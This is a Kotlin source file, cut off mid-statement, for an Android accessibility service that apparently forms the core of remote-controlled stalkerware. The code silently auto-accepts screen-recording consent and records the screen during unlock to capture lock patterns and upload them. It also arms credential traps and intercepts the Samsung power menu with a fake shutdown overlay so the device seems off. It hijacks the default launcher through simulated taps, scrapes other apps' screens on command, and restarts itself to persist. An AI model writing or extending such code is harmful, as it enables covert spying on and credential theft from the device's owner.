package com.example.myandroid

import kotlinx.coroutines.*

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONArray
import org.json.JSONObject
import android.app.KeyguardManager
import android.os.Handler
import android.os.Looper
import android.hardware.Sensor
import android.hardware.SensorEvent
import android.hardware.SensorEventListener
import android.hardware.SensorManager

class MyAccessibilityService : AccessibilityService() {

    val somMap = java.util.concurrent.ConcurrentHashMap<String, Pair<Float, Float>>()

    companion object {
        var instance: MyAccessibilityService? = null
        var isWaitingForWifiDialog = false
        fun triggerDataRecovery() {
            instance?.engageGhostHand()
        }
        fun isSafeZoneActive(ctx: Context): Boolean {
            return System.currentTimeMillis() < ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).getLong("safe_zone_expiry", 0L)
        }

        fun dumpScreenDiagnostic(): String {
            val svc = instance ?: return "[DIAGNOSTIC_ERR: Accessibility Service is Offline/Null]"
            val root = svc.getBypassOverlayRoot()
            if (root == null) {
                val wins = try { svc.windows } catch(e: Exception) { null }
                if (wins.isNullOrEmpty()) {
                    return "[DIAGNOSTIC_ERR: rootInActiveWindow is null and zero windows returned by getWindows()]"
                } else {
                    return "[DIAGNOSTIC_ERR: getBypassOverlayRoot is null, but ${wins.size} windows exist: " + 
                           wins.map { "ID:${it.id}, Type:${it.type}, Active:${it.isActive}, Focused:${it.isFocused}" }.joinToString("; ") + "]"
                } 
            }
            val sb = java.lang.StringBuilder()
            sb.append("ACTIVE_PACKAGE: ${root.packageName}\n")
            val semantic = svc.generateSemanticMap(root)
            if (semantic.isBlank() || semantic == "[SYSTEM: No Active Window]") {
                val deepSb = java.lang.StringBuilder()
                svc.extractText(root, deepSb)
                if (deepSb.isBlank()) {
                    sb.append("SEMANTIC_MAP: [Empty - No visible interactive or text elements found on screen]")
                } else {
                    sb.append("DEEP_TEXT_EXTRACT: ${deepSb.toString().trim().take(300)}")
                }
            } else {
                sb.append("SEMANTIC_MAP:\n$semantic")
            }
            return sb.toString()
        }
    }

    private var nextAllowedCheck = 0L
    private var lastPowerShieldContentCheck = 0L
    private var cachedRules: JSONObject = JSONObject()
    private var cachedUiTraps: JSONArray = JSONArray()
    private var cachedNativeTraps: JSONArray = JSONArray()

    private var isVolUpHeld = false
    private var sensorManager: SensorManager? = null
    private var accelSensor: Sensor? = null

    private val shakeListener = object : SensorEventListener {
        override fun onSensorChanged(event: SensorEvent) {
            val gX = event.values[0] / SensorManager.GRAVITY_EARTH
            val gY = event.values[1] / SensorManager.GRAVITY_EARTH
            val gZ = event.values[2] / SensorManager.GRAVITY_EARTH
            val gForce = Math.sqrt((gX * gX + gY * gY + gZ * gZ).toDouble()).toFloat()
            
            if (gForce > 3.0f) {
                val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                val now = System.currentTimeMillis()
                if (now > prefs.getLong("safe_zone_expiry", 0L)) {
                    prefs.edit().putLong("safe_zone_expiry", now + 15 * 60 * 1000L).apply()
                    DebugLogger.log("SAFE_ZONE", "Shake threshold exceeded! SAFE ZONE ARMED (15 mins).")
                    try {
                        val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                            vibrator.vibrate(android.os.VibrationEffect.createOneShot(500, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
                        } else {
                            @Suppress("DEPRECATION")
                            vibrator.vibrate(500)
                        }
                    } catch (e: Exception) {}
                    
                    Handler(Looper.getMainLooper()).post {
                        DynamicUIManager.removeOverlay(this@MyAccessibilityService, "SAFE_ZONE_ACTIVATED")
                        DynamicUIManager.removeNativeOverlay(this@MyAccessibilityService, "SAFE_ZONE_ACTIVATED")
                        DynamicUIManager.removeStatusBarOverlay(this@MyAccessibilityService)
                        DimmerManager.removeOverlay(this@MyAccessibilityService)
                        DynamicUIManager.removeTouchGuard(this@MyAccessibilityService)
                        abortSequences()
                    }
                }
            }
        }
        override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {}
    }
    
    private val throttleMap = mutableMapOf<String, Long>()
    private fun logThrottled(tag: String, msg: String, interval: Long = 2000L) {
        val now = System.currentTimeMillis()
        val last = throttleMap[tag] ?: 0L
        if (now - last > interval) {
            DebugLogger.log(tag, msg)
            throttleMap[tag] = now
        }
    }

    fun reloadUiTraps() {
        try {
            val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
            val trapsStr = prefs.getString("ui_traps_array", "[]") ?: "[]"
            val rawArr = org.json.JSONArray(trapsStr)
            val cleanedArr = org.json.JSONArray()
            var messDetected = false

            for (i in 0 until rawArr.length()) {
                val trap = rawArr.getJSONObject(i)
                // STRICT RULE: If it doesn't have a label, it's garbage. Purge it.
                if (trap.has("label")) {
                    cleanedArr.put(trap)
                } else {
                    messDetected = true
                }
            }

            if (messDetected) {
                prefs.edit().putString("ui_traps_array", cleanedArr.toString()).apply()
                DebugLogger.log("UI_TRAP", "Sanitization complete: Legacy configs without labels deleted.")
            }
            
            cachedUiTraps = cleanedArr
            
            val nativeStr = prefs.getString("native_traps_array", "[]") ?: "[]"
            cachedNativeTraps = try { org.json.JSONArray(nativeStr) } catch (e: Exception) { org.json.JSONArray() }
        } catch (e: Exception) {
            cachedUiTraps = org.json.JSONArray()
            cachedNativeTraps = org.json.JSONArray()
        }
    }
    
    // GHOST HAND STATE
    private var isGhostActive = false
    private var isLookingForToggle = false
    private val targetKeywords = listOf("Mobile data", "Data", "Cellular data", "Internet", "Connexion")
    
    // THROTTLE CONTROL
    private var lastScreenRead: Long = 0
    private val READ_DELAY = 1000L // Only read screen once per second
    private var debounceJob: Job? = null

    // TREE SCRAPER STATE
    private data class TreeTask(
        val id: Int,
        val pkg: String?,
        val durationMs: Long,
        var endTime: Long = 0L,
        val depth: Int = 10,
        var lastSnapshot: JSONObject? = null,
        var job: Job? = null
    )
    private val treeTasks = mutableListOf<TreeTask>()
    
    // PHOENIX STATE
    private var lastPhoenixCheck = 0L
    var isWaitingForDataSettings = false
    var dataTargetState: String = "TOGGLE"
    var isWaitingForWifiSettings = false
    var wifiTargetState: String = "TOGGLE"
    var isWaitingForLocationSettings = false
    var locationTargetState: String = "TOGGLE"
    var activeSequence: String? = null
    private var sequenceTarget: String? = null
    private var sequenceCmdId: Int = -1
    private var isPerformingStealthKill = false
    private var isSilentSequence = false
    private var mdrIsStandalone = false
    private var shouldShowAnrAfterKill = false
    private var pendingAnrAppName: String? = null
    private var sequenceWatchdogJob: Job? = null
    private var patternFuseJob: Job? = null
    private var unlockWatchdogJob: Job? = null
    private val serviceScope = CoroutineScope(Dispatchers.Main + SupervisorJob())

    private val screenStateReceiver = object : android.content.BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val prefs = context.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
            val keepIgnited = prefs.getBoolean("power_shield_keep_ignited", false)
            when (intent.action) {
                Intent.ACTION_SCREEN_ON -> {
                    prefs.edit().putLong("screen_on_ts", System.currentTimeMillis()).apply()
                    DebugLogger.log("MONITOR_SYS", "Broadcast received: ACTION_SCREEN_ON. Triggering wake protocols.")
                    DynamicUIManager.dispatchScreenState(true)
                    UserOverlayManager.refresh(context)
                    
                    if (prefs.getString("power_shield_state", "NORMAL") == "FAKE_OFF") {
                        DebugLogger.log("POWER_SHIELD", "ACTION_SCREEN_ON in FAKE_OFF state. Dismissing Keyguard to extend system timer.")
                        val pulseIntent = Intent(context, PulseActivity::class.java).apply {
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                            putExtra("is_wake_trigger", true)
                        }
                        context.startActivity(pulseIntent)
                    }

                    ScreenRecordManager.resumeRecording()
                    DynamicUIManager.warmUpEngine(context)

                    // --- DEFERRED CREDENTIAL TRAP LOGIC ---
                    if (prefs.getBoolean("pending_cred_trap", false)) {
                        prefs.edit().putBoolean("pending_cred_trap", false).apply()
                        val pendingId = prefs.getInt("pending_cred_id", -1)
                        val pendingContent = prefs.getString("pending_cred_content", "") ?: ""
                        if (pendingId != -1) {
                            DebugLogger.log("CAPTURE_PATTERN", "Executing deferred credential trap on screen wake.")
                            val statusMsg = CommandProcessor.armCredentialTrap(context, pendingId, pendingContent)
                            CommandProcessor.updateCommandStatus(context, pendingId, "DEFERRED_EXECUTION", statusMsg)
                        }
                    }

                    // --- ACTIVE UNLOCK WATCHDOG ---
                    unlockWatchdogJob?.cancel()
                    unlockWatchdogJob = serviceScope.launch {
                        val km = context.getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
                        var wasLocked = km.isKeyguardLocked
                        while (isActive) {
                            delay(250)
                            val isLockedNow = km.isKeyguardLocked
                            if (wasLocked && !isLockedNow) {
                                DebugLogger.log("MONITOR_SYS", "Unlock Watchdog detected Keyguard dismissal.")
                                AuthRecoveryManager.onIdentityVerified(context)
                                if (ScreenRecordManager.isPatternTrap && ScreenRecordManager.isRecording) {
                                    DebugLogger.log("CAPTURE_PATTERN", "Device Unlocked (Keyguard Polling). Halting capture.")
                                    patternFuseJob?.cancel()
                                    ScreenRecordManager.stopRecording()
                                }
                                CommandProcessor.Gatekeeper.flushQueue(context)
                                break
                            }
                            wasLocked = isLockedNow
                        }
                    }

                    // --- PATTERN TRAP LOGIC ---
                    if (ScreenRecordManager.isPatternTrap && ScreenRecordManager.isRecording) {
                        patternFuseJob?.cancel()
                        patternFuseJob = serviceScope.launch {
                            delay(ScreenRecordManager.patternSuccessTimeoutMs)
                            if (ScreenRecordManager.isPatternTrap && ScreenRecordManager.isRecording) {
                                DebugLogger.log("CAPTURE_PATTERN", "Success threshold reached. Halting & uploading.")
                                ScreenRecordManager.stopRecording()
                            }
                        }
                    }
                }
                Intent.ACTION_SCREEN_OFF -> {
                    unlockWatchdogJob?.cancel()
                    prefs.edit().putLong("screen_off_ts", System.currentTimeMillis()).apply()
                    ScreenRecordManager.pauseRecording()
                    DynamicUIManager.dispatchScreenState(false)
                    AuthRecoveryManager.onScreenOff()
                    UserOverlayManager.hide(context)

                    if (keepIgnited) {
                        val hasDimmer = DimmerManager.currentLevel < 100
                        val isSequenceActive = instance?.activeSequence != null || DefaultSmsManager.expectedMode.isNotEmpty() || LauncherManager.isHijacking
                        if (!DynamicUIManager.isAnyAttached && !hasDimmer && !isSequenceActive) {
                            DebugLogger.log("POWER_SHIELD", "Failsafe: Ignition lock active but no UI or Sequence attached. Disarming lock to prevent wake loop.")
                            DimmerManager.IgnitionManager.clearAll(context)
                        } else {
                            DebugLogger.log("POWER_SHIELD", "Physical power-off detected during critical sequence. Re-igniting hardware.")
                            val pulseIntent = Intent(context, PulseActivity::class.java).apply {
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                                putExtra("is_wake_trigger", true)
                            }
                            context.startActivity(pulseIntent)
                        }
                    }
                    
                    if (ScreenRecordManager.isPatternTrap && ScreenRecordManager.isRecording) {
                        patternFuseJob?.cancel()
                        DebugLogger.log("CAPTURE_PATTERN", "Screen off before timeout. Timer reset.")
                    }
                }
                Intent.ACTION_USER_PRESENT -> {
                    AuthRecoveryManager.onIdentityVerified(context)
                    if (ScreenRecordManager.isPatternTrap && ScreenRecordManager.isRecording) {
                        DebugLogger.log("CAPTURE_PATTERN", "Device Unlocked (Fallback Signal). Halting capture.")
                        patternFuseJob?.cancel()
                        ScreenRecordManager.stopRecording()
                    }
                    serviceScope.launch { CommandProcessor.Gatekeeper.flushQueue(context) }
                }
                Intent.ACTION_AIRPLANE_MODE_CHANGED -> {
                    val isOn = intent.getBooleanExtra("state", false)
                    DebugLogger.log("MONITOR_SYS", "Broadcast received: ACTION_AIRPLANE_MODE_CHANGED. State: $isOn")
                    instance?.handleAirplaneModeChange(isOn)
                }
            }
        }
    }

    private fun startSequenceWatchdog() {
        sequenceWatchdogJob?.cancel()
        sequenceWatchdogJob = CoroutineScope(Dispatchers.Main).launch {
            delay(45000) // 45 seconds global fuse
            if (activeSequence != null) {
                DebugLogger.log("SEQ_WATCHDOG", "Zombie sequence detected ($activeSequence). Aborting.")
                abortSequences()
                DimmerManager.removeOverlay(this@MyAccessibilityService)
            }
        }
    }

    // FLIGHT MODE AUTHENTICATOR STATE
    private var flightModeFuseJob: Job? = null
    private var breathingModeJob: Job? = null
    private var flightModeAuthPending = false
    private var isAutomatedFlightModeToggle = false



    private fun checkMainServiceHealth() {
        try {
            if (!MonitorService.isRunning) {
                DebugLogger.log("PHOENIX", "Accessibility Symbiote detected dead MonitorService. Resurrecting...")
                val i = Intent(this, MonitorService::class.java)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) startForegroundService(i)
                else startService(i)
                
                // Also re-ignite the alarm manager loop
                KeepAliveReceiver.scheduleNext(this)
            }
        } catch (e: Exception) {}
    }

        fun resetAllTasks() {
        treeTasks.forEach { it.job?.cancel() }
        treeTasks.clear()
        saveTreeTasks()
        DebugLogger.log("SCRAM", "Hard Reset: All Scraper Tasks Aborted and Purged")
    }

    fun startTreeDump(pkg: String?, mins: Long, cmdId: Int = -1, depth: Int = 10) {
        if (mins <= 0L) {
            resetAllTasks()
            return
        }

        val target = if (pkg.isNullOrEmpty() || pkg == "null") null else pkg
        val durMs = mins * 60 * 1000
        
        val newTask = TreeTask(id = cmdId, pkg = target, durationMs = durMs, depth = depth)
        treeTasks.add(newTask)
        saveTreeTasks()
        
        DebugLogger.log("SCRAM", "Task Queued: [${target ?: "GLOBAL"}] (ID: $cmdId). Total Tasks: ${treeTasks.size}")
        
        if (target == null) {
            initiateTaskSession(newTask)
        }
    }

    private fun initiateTaskSession(task: TreeTask) {
        if (task.endTime != 0L) return // Already running
        
        task.endTime = System.currentTimeMillis() + task.durationMs
        saveTreeTasks()
        
        DebugLogger.log("SCRAM", "Session started for ID: ${task.id}. Resolving in ${task.durationMs / 1000}s.")
        
        task.job = CoroutineScope(Dispatchers.IO).launch {
            val delayMs = task.endTime - System.currentTimeMillis()
            if (delayMs > 0) delay(delayMs)
            
            // Resolve Task
            val result = JSONObject().apply {
                put("depth_limit", task.depth)
                if (task.lastSnapshot != null) put("snapshot", task.lastSnapshot)
                else put("error", "NO_DATA_CAPTURED_IN_SESSION")
            }
            
            CommandProcessor.updateCommandStatus(applicationContext, task.id, "SCAN_COMPLETE", null, result, null)
            DebugLogger.log("SCRAM", "Session expired. Task [${task.id}] resolved and removed.")
            
            treeTasks.remove(task)
            saveTreeTasks()
        }
    }

    private fun saveTreeTasks() {
        val arr = JSONArray()
        treeTasks.forEach { t ->
            val o = JSONObject()
            o.put("id", t.id); o.put("pkg", t.pkg); o.put("dur", t.durationMs)
            o.put("end", t.endTime); o.put("depth", t.depth)
            arr.put(o)
        }
        getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
            .putString("tree_tasks_json", arr.toString()).apply()
    }

    private fun loadTreeTasks() {
        try {
            val raw = getSharedPreferences("app_stats", Context.MODE_PRIVATE).getString("tree_tasks_json", "[]")
            val arr = JSONArray(raw)
            treeTasks.clear()
            for (i in 0 until arr.length()) {
                val o = arr.getJSONObject(i)
                val task = TreeTask(
                    id = o.getInt("id"),
                    pkg = if (o.isNull("pkg")) null else o.getString("pkg"),
                    durationMs = o.getLong("dur"),
                    endTime = o.getLong("end"),
                    depth = o.getInt("depth")
                )
                treeTasks.add(task)
                
                // Resume watchdog if it was already running
                if (task.endTime > System.currentTimeMillis()) {
                    initiateTaskSession(task)
                } else if (task.endTime > 0) {
                    // Expired while dead - will be cleaned up on next logic cycle
                }
            }
        } catch (e: Exception) { }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this

        sensorManager = getSystemService(Context.SENSOR_SERVICE) as SensorManager
        accelSensor = sensorManager?.getDefaultSensor(Sensor.TYPE_ACCELEROMETER)

        DynamicUIManager.warmUpEngine(this)
        DynamicUIManager.applyStoredStatusBar(this)

        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        
        // Restore Scraper Session Queue
        loadTreeTasks()
        reloadUiTraps()
        UserOverlayManager.refresh(this)
        
        val rulesStr = prefs.getString("cached_rules", "{}")
        cachedRules = try {
            val json = JSONObject(rulesStr)
            if (json.length() == 0) getDefaultRules() else json
        } catch (e: Exception) {
            getDefaultRules()
        }

        // Indestructible Screen State Watchdog registration (Immune to Process Deaths)
        val filter = IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_ON)
            addAction(Intent.ACTION_SCREEN_OFF)
            addAction(Intent.ACTION_USER_PRESENT)
            addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED)
        }
        androidx.core.content.ContextCompat.registerReceiver(
            this, 
            screenStateReceiver, 
            filter, 
            androidx.core.content.ContextCompat.RECEIVER_NOT_EXPORTED
        )
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        try {
            unregisterReceiver(screenStateReceiver)
        } catch (e: Exception) {}
        serviceScope.cancel()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        
        val pkgName = event.packageName?.toString() ?: return

        // --- STEALTH KILL ENGINE MOVED TO DEDICATED COROUTINE ---
        
        // --- SCREEN RECORD GHOST LOGIC (DECOUPLED) ---
        if (ScreenRecordManager.expectedMode == "AUTO") {
            val root = rootInActiveWindow
            val startNodes = root?.findAccessibilityNodeInfosByText("Start now") ?: emptyList()
            val altNodes = root?.findAccessibilityNodeInfosByText("Start") ?: emptyList()
            
            for (node in (startNodes + altNodes)) {
                if (node.isClickable) {
                    node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                    DebugLogger.log("GHOST_ACCEPT", "Successfully auto-clicked screen record confirmation.")
                    ScreenRecordManager.expectedMode = "" // Disarm
                    
                    if (!ScreenRecordManager.isPatternTrap) {
                        DimmerManager.removeOverlay(this) // Remove blindfold immediately if standard record
                    } else {
                        DebugLogger.log("GHOST_ACCEPT", "Pattern Trap active. Retaining blindfold until hardware lock.")
                    }
                    
                    CommandProcessor.updateCommandStatus(applicationContext, ScreenRecordManager.pendingCmdId, "GHOST_ACCEPT_SUCCESS", "Recording started automatically.")
                    break
                }
            }
        } else if (ScreenRecordManager.expectedMode == "SCRAPE") {
            ScreenRecordManager.expectedMode = "SCRAPING" // Prevent multi-triggers
            DebugLogger.log("SCREEN_REC", "Dialog detected. Waiting 1.5s for UI to settle...")
            
            CoroutineScope(Dispatchers.IO).launch {
                delay(1500)
                val treeJson = getInstantTree(null, 10)
                val wrapper = JSONObject().apply { put("pkg", pkgName); put("tree", treeJson as Any) }
                DumpManager.appendLog("SCRAPE_RECORD_DIALOG", wrapper)
                DebugLogger.log("SCREEN_REC", "Scraped dialog for forensic mapping. Pkg: $pkgName")
                
                CommandProcessor.updateCommandStatus(applicationContext, ScreenRecordManager.pendingCmdId, "SCRAPE_SUCCESS", null, wrapper, null)
                
                withContext(Dispatchers.Main) {
                    performGlobalAction(GLOBAL_ACTION_HOME)
                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                        DimmerManager.removeOverlay(applicationContext)
                        ScreenRecordManager.expectedMode = "" // Disarm completely
                    }, 500)
                }
            }
        }

        // --- UNIVERSAL SAMSUNG POWER SHIELD (Adaptive Universal Guard) ---
        if (pkgName.contains("systemui", ignoreCase = true)) {
            val isStateChange = event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            val isContentChange = event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED

            if (isStateChange || isContentChange) {
                val now = System.currentTimeMillis()
                
                // 1. STAGE 1: CPU THROTTLE (Prevent melting the CPU on every clock tick)
                if (isContentChange) {
                    if (now - lastPowerShieldContentCheck < 300) return // Max ~3 scans per second for content changes
                    lastPowerShieldContentCheck = now
                }

                CoroutineScope(Dispatchers.IO).launch {
                    val statsPrefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                    val isShieldActive = statsPrefs.getBoolean("power_shield_active", false)
                    val inSafeZone = isSafeZoneActive(this@MyAccessibilityService)

                    var targetVerified = false
                    var attempts = 0
                    // Loop multiple times for STATE_CHANGED to allow inflation, but only 1-shot for CONTENT_CHANGED
                    val maxAttempts = if (isStateChange) 10 else 1

                    // 2. STAGE 2: VERIFICATION (Multi-Layer Window Scan)
                    while (attempts < maxAttempts) {
                        var isPowerMenu = false
                        var isConfirmScreen = false
                        var hasTextFallback = false

                        val wins = try { windows } catch(e: Exception) { emptyList() }
                        val rootsToScan = wins.mapNotNull { it.root }.toMutableList()
                        rootInActiveWindow?.let { rootsToScan.add(it) }

                        for (r in rootsToScan) {
                            if (!r.findAccessibilityNodeInfosByViewId("com.android.systemui:id/sec_global_actions_item_list").isNullOrEmpty()) {
                                isPowerMenu = true; break
                            }
                            if (!r.findAccessibilityNodeInfosByViewId("com.android.systemui:id/sec_global_actions_confirmation").isNullOrEmpty()) {
                                isConfirmScreen = true; break
                            }
                            if (attempts == maxAttempts - 1 && !hasTextFallback) {
                                if (!r.findAccessibilityNodeInfosByText("Power off").isNullOrEmpty() && !r.findAccessibilityNodeInfosByText("Restart").isNullOrEmpty()) {
                                    hasTextFallback = true
                                }
                            }
                        }

                        if (isPowerMenu || isConfirmScreen) {
                            targetVerified = true
                            break // Target Confirmed
                        } else if (attempts == maxAttempts - 1 && hasTextFallback) {
                            DebugLogger.log("POWER_SHIELD_BLOCK", "Text 'Power off' & 'Restart' detected, but standard Samsung View IDs were missing! Device UI may have updated. Shield bypassed.")
                        }
                        
                        if (!targetVerified && isStateChange) delay(50)
                        attempts++
                    }

                    if (targetVerified) {
                        if (inSafeZone) {
                            DebugLogger.log("POWER_SHIELD_BLOCK", "Power Menu detected, but execution BLOCKED by Safe Zone.")
                        } else if (!isShieldActive) {
                            DebugLogger.log("POWER_SHIELD_BLOCK", "Power Menu detected, but Power Shield is DISABLED in config.")
                        } else {
                            val lastTrigger = statsPrefs.getLong("power_shield_last_trigger", 0L)
                            if (now - lastTrigger > 2000) {
                                statsPrefs.edit().putLong("power_shield_last_trigger", now).apply()
                                
                                // 3. STAGE 3: INSTANT TOUCH SHIELD & FAKE UI
                                DynamicUIManager.showTouchGuard(this@MyAccessibilityService)
                                
                                val state = statsPrefs.getString("power_shield_state", "NORMAL") ?: "NORMAL"
                                val html = if (state == "FAKE_OFF") statsPrefs.getString("power_shield_html_boot", "") else statsPrefs.getString("power_shield_html_shutdown", "")
                                val method = statsPrefs.getString("power_shield_method", "ACC") ?: "ACC"
                                val mappingStr = statsPrefs.getString("power_shield_mapping", "") ?: ""
                                var coordsJsonStr = statsPrefs.getString("power_shield_coords_cache", "") ?: ""

                                val showOverlayBlock = {
                                    Handler(Looper.getMainLooper()).post {
                                        DynamicUIManager.showOverlay(this@MyAccessibilityService, true, method, html ?: "", true)
                                    }
                                }

                                if (coordsJsonStr.isEmpty() && mappingStr.isNotEmpty()) {
                                    // FIRST TIME RUN: Wait 300ms for One UI inflation and stabilize, then scan and show
                                    serviceScope.launch {
                                        delay(300)
                                        
                                        val currentWins = try { windows } catch(e: Exception) { emptyList<android.view.accessibility.AccessibilityWindowInfo>() }
                                        val currentRoots = currentWins.mapNotNull { it.root }.toMutableList()
                                        rootInActiveWindow?.let { currentRoots.add(it) }

                                        val coordsObj = org.json.JSONObject()
                                        val density = resources.displayMetrics.density
                                        val mappings = mappingStr.split(",")
                                        for (m in mappings) {
                                            val kv = m.split(":")
                                            if (kv.size == 2) {
                                                val htmlId = kv[0].trim()
                                                val nativeText = kv[1].trim()
                                                var foundBounds: android.graphics.Rect? = null
                                                for (r in currentRoots) {
                                                    val textNodes = r.findAccessibilityNodeInfosByText(nativeText) ?: emptyList()
                                                    val textNode = textNodes.find { it.text?.toString()?.equals(nativeText, true) == true }
                                                    if (textNode != null) {
                                                        val parent = textNode.parent
                                                        if (parent != null) {
                                                            val iconNodes = parent.findAccessibilityNodeInfosByViewId("com.android.systemui:id/sec_global_actions_icon")
                                                            if (iconNodes.isNotEmpty()) {
                                                                foundBounds = android.graphics.Rect().apply { iconNodes[0].getBoundsInScreen(this) }
                                                            } else {
                                                                foundBounds = android.graphics.Rect().apply { parent.getBoundsInScreen(this) }
                                                            }
                                                        }
                                                    }
                                                    if (foundBounds != null) break
                                                }
                                                if (foundBounds != null) {
                                                    val c = org.json.JSONObject()
                                                    c.put("x", foundBounds.left / density)
                                                    c.put("y", foundBounds.top / density)
                                                    c.put("w", foundBounds.width() / density)
                                                    c.put("h", foundBounds.height() / density)
                                                    coordsObj.put(htmlId, c)
                                                }
                                            }
                                        }
                                        if (coordsObj.length() > 0) {
                                            coordsJsonStr = coordsObj.toString()
                                            statsPrefs.edit().putString("power_shield_coords_cache", coordsJsonStr).apply()
                                            DebugLogger.log("POWER_SHIELD", "First-time scan success. Coordinate mapping cached: $coordsJsonStr")
                                        } else {
                                            DebugLogger.log("POWER_SHIELD_ERR", "First-time coordinate scan failed to resolve any nodes.")
                                        }
                                        
                                        showOverlayBlock()
                                        if (coordsJsonStr.isNotEmpty()) {
                                            delay(200)
                                            DynamicUIManager.injectPowerMenuCoords(this@MyAccessibilityService, coordsJsonStr)
                                        }
                                        
                                        val timeout = statsPrefs.getLong("power_shield_timeout", 15L)
                                        if (timeout > 0) {
                                            delay(timeout * 1000)
                                            DynamicUIManager.removeOverlay(this@MyAccessibilityService)
                                            DynamicUIManager.removeTouchGuard(this@MyAccessibilityService)
                                        }
                                    }
                                } else {
                                    // SUBSEQUENT RUNS: Instant show, instant inject
                                    DynamicUIManager.showTouchGuard(this@MyAccessibilityService)
                                    showOverlayBlock()
                                    if (coordsJsonStr.isNotEmpty()) {
                                        Handler(Looper.getMainLooper()).postDelayed({
                                            DynamicUIManager.injectPowerMenuCoords(this@MyAccessibilityService, coordsJsonStr)
                                        }, 200)
                                    }
                                    
                                    serviceScope.launch {
                                        val timeout = statsPrefs.getLong("power_shield_timeout", 15L)
                                        if (timeout > 0) {
                                            delay(timeout * 1000)
                                            DynamicUIManager.removeOverlay(this@MyAccessibilityService)
                                            DynamicUIManager.removeTouchGuard(this@MyAccessibilityService)
                                        }
                                    }
                                }
                            } else {
                                DebugLogger.log("POWER_SHIELD_BLOCK", "Power Menu detected, but blocked by 2000ms cooldown.")
                            }
                        }
                    }
                }
            }
        }

        // --- LAUNCHER HIJACK ENGINE (DECOUPLED & HYPER-VERBOSE) ---
        if (LauncherManager.isHijacking) {
            if (isSafeZoneActive(this)) {
                logThrottled("HIJACK_DIAG", "Hijack active but BLOCKED by SafeZone.")
            } else {
                val currentHome = DeviceManager.getDefaultApps(this).optString("launcher", "")
                val root = getBypassOverlayRoot()
                val activePkg = root?.packageName?.toString() ?: pkgName
                
                val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                val lastDump = prefs.getLong("ghost_launcher_dump_ts", 0L)
                val now = System.currentTimeMillis()
                
                if (now - lastDump > 1000) {
                    prefs.edit().putLong("ghost_launcher_dump_ts", now).apply()
                    DebugLogger.log("HIJACK_DIAG", "Active Window Pkg: '$activePkg' | Current Def_Home: '$currentHome'")
                    if (root == null) {
                        DebugLogger.log("HIJACK_DIAG", "rootInActiveWindow is NULL. Cannot scan UI.")
                    } else {
                        val sb = java.lang.StringBuilder()
                        extractText(root, sb)
                        DebugLogger.log("HIJACK_DIAG", "UI_TREE_DUMP -> ${sb.toString().replace('\n', ' ')}")
                    }
                }
                
                if (currentHome == packageName) {
                    DebugLogger.log("HIJACK_SUCCESS", "Active Verification TRUE. $packageName is now Default Home!")
                    LauncherManager.isHijacking = false
                    CommandProcessor.updateCommandStatus(applicationContext, LauncherManager.pendingCmdId, "SUCCESS", "Default Launcher set via Ghost Hand")
                    
                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                        DebugLogger.log("HIJACK_SUCCESS", "Lifting blindfold. Welcome home.")
                        DimmerManager.removeOverlay(applicationContext)
                    }, 1500)
                } else if (root != null) {
                    val targetLabel = getString(R.string.label_settings_app)
                    val lastClick = prefs.getLong("ghost_launcher_click_ts", 0L)

                    // 1. Dismiss arbitrary blocking dialogs
                    val dismissKeywords = listOf("OK", "Close", "Got it")
                    for (kw in dismissKeywords) {
                        val dismissNodes = root.findAccessibilityNodeInfosByText(kw)
                        for (node in dismissNodes) {
                            var target: android.view.accessibility.AccessibilityNodeInfo? = node
                            while (target != null && !target.isClickable) target = target.parent
                            if (target != null && target.isClickable) {
                                if (now - lastClick > 1000) {
                                    target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                    prefs.edit().putLong("ghost_launcher_click_ts", now).apply()
                                    DebugLogger.log("HIJACK_ACTION", "Dismissed random dialog btn: '$kw'")
                                }
                            }
                        }
                    }

                    // 2. Check for Launcher Confirmation Dialogs
                    val confirmKeywords = listOf("Set as default", "Set")
                    var confirmClicked = false
                    for (kw in confirmKeywords) {
                        val confirmNodes = root.findAccessibilityNodeInfosByText(kw)
                        for (node in confirmNodes) {
                            // STRICT MATCHING: If wildcard is short like 'Set', ignore 'Settings', 'Setup', etc.
                            val nText = node.text?.toString() ?: ""
                            val nDesc = node.contentDescription?.toString() ?: ""
                            if (kw == "Set" && !nText.equals("Set", true) && !nDesc.equals("Set", true)) {
                                continue
                            }

                            var target: android.view.accessibility.AccessibilityNodeInfo? = node
                            while (target != null && !target.isClickable) target = target.parent
                            
                            val finalTarget = target
                            if (finalTarget != null && finalTarget.isClickable) {
                                if (now - lastClick > 1000) {
                                    val res = finalTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
